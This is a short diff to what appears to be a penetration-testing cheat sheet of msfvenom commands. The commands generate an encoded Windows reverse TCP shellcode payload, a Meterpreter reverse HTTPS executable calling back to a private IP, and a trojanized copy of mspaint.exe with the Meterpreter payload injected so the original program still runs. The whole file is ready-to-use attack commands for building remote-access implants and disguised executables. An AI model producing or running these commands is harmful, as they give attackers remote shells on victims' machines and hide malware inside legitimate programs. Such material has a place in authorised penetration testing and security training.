@@ -1,2 +1,9 @@
 # Generate an encoded reverse_tcp payload and prevents the application from crashing with the "thread" exit function
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread\
+ -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
+# Generate a meterpreter reverse https executable
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.30.229 LPORT=8443 -f exe -o reverse_meterpreter.exe
+
+# Inject payload in an existing PE (the -k options creates a new thread so the original program can run)
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.30.229 LPORT=8443 -f exe -o reverse_meterpreter.exe -x /tmp/mspaint.exe -o embedded_meterpreter.exe -k
